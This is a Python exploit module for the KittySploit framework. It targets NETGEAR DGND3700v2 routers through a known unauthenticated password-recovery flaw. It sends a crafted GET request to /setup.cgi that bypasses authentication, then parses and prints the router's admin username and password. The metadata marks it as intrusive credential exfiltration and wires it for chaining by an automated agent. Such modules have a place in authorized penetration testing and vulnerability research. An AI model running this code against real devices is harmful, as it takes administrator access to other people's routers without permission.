#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Dump NETGEAR DGND3700v2 admin credentials via password recovery page."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'NETGEAR DGND3700v2 - Unauth Password Recovery Dump',
        'description': (
            'Retrieves admin username/password from '
            '/setup.cgi?next_file=passwordrecovered.htm on NETGEAR DGND3700v2 '
            '(PSV-2021-0343).'
        ),
        'author': ['KittySploit Team'],
        'platform': Platform.MULTI,
        'references': [
            'https://kb.netgear.com/000064760/Security-Advisory-for-Multiple-Vulnerabilities-on-DGND3700v2-PSV-2021-0343',
        ],
        'tags': ['netgear', 'router', 'credentials', 'exposure', 'unauth'],
        'agent': {
            'risk': 'intrusive',
            'effects': ['data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': True,
            'produces': ['risk_signals'],
            'cost': 1.2,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'admin_surface', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [
                    'scanner/http/netgear_dgnd3700_password_recover_detect',
                ],
            },
        },
    }

    def run(self):
        path = '/setup.cgi?next_file=passwordrecovered.htm&foo=currentsetting.htm'
        print_status(f'Fetching {path} ...')
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            print_error('Password recovery page not accessible')
            return False
        body = r.text or ''
        user = re.search(r'Router Admin Username</span>:[^;]+;([^<]+)<', body)
        passwd = re.search(r'Router Admin Password</span>:[^;]+;([^<]+)<', body)
        if not user or not passwd:
            print_error('Credentials not found in response')
            return False
        print_success(f'Admin Username: {user.group(1).strip()}')
        print_success(f'Admin Password: {passwd.group(1).strip()}')
        return True
